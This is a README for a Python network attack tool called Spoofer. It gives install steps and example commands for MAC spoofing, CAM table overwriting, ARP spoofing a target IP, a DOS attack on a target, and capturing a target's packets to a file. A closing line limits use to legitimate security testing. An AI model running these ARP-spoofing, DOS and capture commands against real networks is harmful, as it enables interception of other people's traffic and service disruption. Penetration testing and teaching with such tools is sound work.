# Spoofer

A versatile tool for MAC address spoofing, ARP spoofing, CAM overwriting, DOS attacks, and packet capturing.

## Dependencies

- `python3`
- `scapy`
- `arp-scan`
- `arpspoof`
- `hping3`

## Installation

1. **Install Python dependencies:**
   ```bash
   pip install scapy
   ```

2. **Install system dependencies:**
   ```bash
   sudo dnf install arp-scan arpspoof hping3
   ```

## Usage

### Scan Subnet for Available MAC Addresses
```bash
sudo python spoofer.py --scan
```

### Change MAC Address
```bash
sudo python spoofer.py -i <interface> -m <manufacturer>
```
*Example:*
```bash
sudo python spoofer.py -i eth0 -m samsung
```

### Revert to Original MAC Address
```bash
sudo python spoofer.py -i <interface> --revert
```
*Example:*
```bash
sudo python spoofer.py -i eth0 --revert
```

### Overwrite CAM of Local Router
```bash
sudo python spoofer.py -i <interface> --overwrite-cam --router-ip <router-ip>
```
*Example:*
```bash
sudo python spoofer.py -i eth0 --overwrite-cam --router-ip 192.168.1.1
```

### ARP Spoof Devices to Believe You Are the Gateway
```bash
sudo python spoofer.py -i <interface> --arp-spoof --router-ip <router-ip> --target-ip <target-ip>
```
*Example:*
```bash
sudo python spoofer.py -i eth0 --arp-spoof --router-ip 192.168.1.1 --target-ip 192.168.1.100
```

### Perform DOS Attack on Target
```bash
sudo python spoofer.py -i <interface> --dos --target-ip <target-ip>
```
*Example:*
```bash
sudo python spoofer.py -i eth0 --dos --target-ip 192.168.1.100
```

### Capture Packets Intended for the Target
```bash
sudo python spoofer.py -i <interface> --capture --target-ip <target-ip> --output-file <output-file>
```
*Example:*
```bash
sudo python spoofer.py -i eth0 --capture --target-ip 192.168.1.100 --output-file captured_packets.pcap
```

## Notes

- Ensure you have the necessary permissions to run the commands and perform the operations.
- Use responsibly and only for legitimate security testing and educational purposes.
```

